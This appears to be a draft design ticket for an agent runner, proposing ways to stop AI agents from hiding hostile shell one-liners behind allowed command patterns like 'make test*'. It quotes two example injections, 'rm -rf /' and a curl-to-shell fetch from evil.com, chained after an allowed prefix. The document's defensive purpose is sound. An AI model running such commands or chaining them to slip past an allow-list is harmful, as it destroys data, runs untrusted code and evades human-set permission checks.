---
title: improved bash allow lists
type: idea
status: draft
lineage: improved-bash-allow-lists
priority: high
labels:
    - agent
    - agent-runner
    - security
    - directives
    - backend
release: KC-Release6
---

## Raw Idea

## Raw Idea
Need to be able to allow agents to define simple allow lists like make test* but prevent them from including bash oneliners which hide bad intent.

Can use alternate wildcards or not use bash -c or pre-parse the commands and remove anything after the first ; or &&

## Idea

Agents need to declare simple allow-lists for bash commands (e.g. `make test*`) so the runner can gate what they execute. Currently, naive glob matching is vulnerable to one-liner injection: a permitted pattern like `make test*` could match `make test; rm -rf /` or `make test && curl evil.com | sh`, hiding malicious intent behind an allowed prefix.

Three mitigations are worth evaluating: (1) use a restricted wildcard syntax that only matches the command name and its direct arguments, never shell metacharacters; (2) reject any command string that invokes `bash -c` (or `sh -c`) directly; (3) pre-parse every incoming command and strip or reject anything after the first `;`, `&&`, `||`, `|`, or backtick before matching against the allow-list. A combination of (1) and (3) is likely the right default — deny metacharacters at parse time, then match the sanitised token against the pattern.

The implementation should live in the agent runner / sandbox layer so that all drivers (ClaudeCode, OpenAI-compatible, etc.) benefit automatically. The allow-list format in `lifecycle/config.yaml` agent entries should be extended to express the restricted pattern syntax, and the validation logic should be unit-tested against a suite of injection payloads.
